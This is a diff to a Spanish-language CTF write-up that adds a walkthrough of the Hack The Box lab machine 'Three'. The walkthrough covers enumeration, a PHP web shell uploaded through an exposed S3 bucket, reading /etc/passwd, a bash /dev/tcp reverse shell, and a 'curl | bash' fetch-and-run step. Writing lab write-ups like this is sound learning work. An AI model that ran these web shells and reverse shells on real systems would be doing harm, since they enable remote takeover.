@@ -818,7 +818,7 @@ select * from config;
 Y hemos completado la máquina.
 
 <hr />
-<h2 id="crocodile"><h1 class="titulo-principal">Cocodrile</h1></h2>
+<h2 id="crocodile"><h1 class="titulo-principal">Crocodrile</h1></h2>
 
 <div id="imgs" style="text-align: center;">
   <img src="/assets/images/StartingPoint/cocodrile/crocodile.png" alt="under" oncontextmenu="return false;">
@@ -1154,6 +1154,208 @@ Y con un poco de búsqueda encontramos la flag:
 
 ![[HTB/Starting Point/Tier 2/Responder/Images/flag.png]]
  y hemos completado la máquina.
+
+<hr />
+<h2 id="three"><h1 class="titulo-principal">Three</h1></h2>
+
+<div id="imgs" style="text-align: center;">
+  <img src="/assets/images/StartingPoint/three/three.webp" alt="under" oncontextmenu="return false;">
+</div>
+
+
+
+
+
+Encendemos la máquina y nos da la dirección IP 10.129.91.236 y probamos a lanzar unas trazas ICMP para saber si el host está activo.
+
+```bash
+❯ ping -c 5 10.129.91.236
+PING 10.129.91.236 (10.129.91.236) 56(84) bytes of data.
+64 bytes from 10.129.91.236: icmp_seq=1 ttl=63 time=144 ms
+64 bytes from 10.129.91.236: icmp_seq=2 ttl=63 time=99.6 ms
+64 bytes from 10.129.91.236: icmp_seq=3 ttl=63 time=97.8 ms
+64 bytes from 10.129.91.236: icmp_seq=4 ttl=63 time=97.8 ms
+64 bytes from 10.129.91.236: icmp_seq=5 ttl=63 time=98.1 ms
+--- 10.129.91.236 ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4004ms
+rtt min/avg/max/mdev = 97.779/107.395/143.705/18.167 ms
+```
+
+Con un TTL 63 sabemos que nos estamos enfrentando a una máquina Linux.
+# Enumeración
+
+Para la fase de enumeración con nmap vamos a lanzar un escaneo rápido y sigiloso:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.91.236 -oG allPorts
+```
+
+
+![[HTB/Starting Point/Tier 2/Three/Images/nmap.png]]
+
+Limpiamos ruido y con **extractPorts** copiamos los puertos abiertos para realizar un escaneo exhaustivo con nmap y una serie de scripts básico de reconocimiento para saber la versión y servicio:
+
+```bash
+nmap -sCV -p22,80 10.129.91.236 -oN targeted
+```
+
+![[HTB/Starting Point/Tier 2/Three/Images/nmap2.png]]
+
+Vemos un puerto 22 y un 80 abiertos, probamos con la herramienta `whatweb` a enumerar un poco el servicio web:
+
+![[HTB/Starting Point/Tier 2/Three/Images/whatweb.png]]
+
+Vemos un potencial dominio 'thetoppers.htb' pero, por ahora sigamos enumerando, vamos a realizar un escaneo con nmap y script programado en Lua para utilizar un diccionario que contiene posibles rutas comunes que pueda contemplar este servicio web:
+
+```bash
+nmap --script http-enum 10.129.91.236 -oN webScan
+```
+
+![[HTB/Starting Point/Tier 2/Three/Images/webscan.png]]
+
+# Explotación
+
+Al no encontrar mucha información de los escaneos web, probamos a enumerar directorios con la herramienta `gobuster`
+
+![[HTB/Starting Point/Tier 2/Three/Images/dirbust.png]]
+
+No hay nada, así que probamos con posibles archivos .PHP:
+
+![[filebust.png]]
+
+No encontramos nada entonces abriremos la web
+
+![[HTB/Starting Point/Tier 2/Three/Images/web.png]]
+
+Por más exhaustiva que sea la búsqueda en la web no hay nada pero, no significa que no haya nada, ya que en realidad si usamos `gobuster` para filtrar por **VHOST** la cosa cambia totalmente:
+
+---
+# ¿Qué es VHOST?
+
+Es bastante sencillo de entender este concepto ya que un servidor tiene una dirección IP, pero puede tener multiples dominos, y en base al dominio que se acceda la información puede variar y ser diferente.
+
+> No es lo mismo acceder a 10.129.91.236, que acceder a thetoppers.htb. Pueden diferentes en su contenido o tener una ligera variación.
+
+----
+
+![[vhostbust.png]]
+
+Y encontramos 2 subdominios pero, el único que nos interesa es el `s3.thetoppers.htb` ya que S3 proviene de un servicio de Cloud de Amazon:
+
+---
+# ¿Qué es S3 Bucket AWS?
+
+Un bucket S3 de AWS es un recurso de almacenamiento en la nube que permite guardar datos manera segura, eficiente y escalable. Es un servicio de Amazon Web Services (AWS) llamado Simple Storage Service (S3)
+
+----
+
+Para conectarnos podemos instalar 'aws-cli':
+
+![[aws.png]]
+
+La típica para usar el cliente de aws es utilizar el comando, seguido de llamar a s3 y ejecutar por ejemplo un 'ls':
+
+```bash
+aws --endpoint=http://s3.thetoppers.htb s3 ls
+```
+
+En caso de arrojar un error simplemente ejecutamos `aws configure` y ponemos todo como **temp**.
+
+![[aws2.png]]
+
+Tenemos capacida de lectura y podemos listar el contenido almacenado en el Bucket de S3 Amazon.
+
+![[aws3.png]]
+
+Ya que la página interpreta código .PHP, podemos crear un pequeño script .PHP para subirlo al Bucket S3 de Amazon.
+
+**Shell.php**
+```php
+<?php
+	system($_GET["cmd"]);
+?>
+```
+
+Lo subimos ejecutando `cp shell.php` al Bucket.
+
+![[shell2.png]]
+
+Y en la web probamos a cargar el recurso, y no vemos nada eso es buena señal.
+
+![[HTB/Starting Point/Tier 2/Three/Images/intrusion.png]]
+
+Ya que a través de la variables `cmd`podremos ejecutar comandos de manera remota y hemos conseguido un RCE Remote Command Execution.
+
+![[intrusion2.png]]
+
+Probamos a listar el '/etc/passwd'. Y vemos que 2 usuarios tienen una Bash como consola.
+
+![[intrusion3.png]]
+
+Como podemos subir contenido al Bucket, nos podemos crear una Reverse Shell, entonces la máquina nos va a enviar una Bash a nuestra máquina como atacante.
+
+**Reverse.sh**
+```bash
+#!/bin/bash
+
+bash -i >& /dev/tcp/10.10.16.84/1337 0>&1
+```
+
+Subimos el Reverse.sh, nos montamos con `python3 -m http.server 8000` Un servidor HTTP, y nos ponemos en escucha con la herramienta `netcat` por el puerto 1337.
+
+![[intrusion4.png]]
+
+Si entramos a la página y escribos muestra shell, debemos de poder ver en texto plano el código:
+
+![[intrusion5.png]]
+
+Lo que debemos hacer es en la variable `cmd` ejecutar:
+
+```bash
+curl 10.10.16.84:8000/lian.sh|bash
+```
+
+![[intrusion6.png]]
+
+Y revisando nuestra terminal vemos que el servidor web montado con Python ha recibido una petición Get. Y por el puerto 1337 con netcat hemos recibido una conexión. 
+
+![[intrusion7.png]]
+
+Hemos hecho la intrusión en la máquina y vemos la flag:
+
+![[HTB/Starting Point/Tier 2/Three/Images/flag.png]]
+
+---
+# Bonus
+
+Al recibir la conexión con la herramienta `netcat` para tener un mejor control de la consola, podemos hacer un tratamiento TTY, basicamente poder usar la consola que nos la máquina sin problemas. Para eso ejecutamos una vez recibida la consola:
+
+```bash
+Pulsamos ------> Ctrl + z
+y Escribimos --> stty raw -echo; fg
+```
+
+Y terminamos escribiendo:
+
+```bash
+[1]  + continued  nc -nlvp 443
+                              reset
+reset: unknown terminal type unknown
+Terminal type? xterm
+```
+
+Exportamos las variables de entorno **TERM** y **SHELL**
+
+```bash
+www-data@host:/$ export TERM=xterm
+www-data@host:/$ export SHELL=bash
+```
+
+
+- `export TERM=xterm` -> Debemos hacer esto ya que a pesar de haberle indicado que queríamos una **xterm** al momento de reiniciarlo la variable de entorno **TERM** vale **dump** (Se usa esta variable para poder usar los atajos de teclado).
+- `export SHELL=bash` -> Para que nuestra shell sea una bash.
+---
+
 
 ---
 
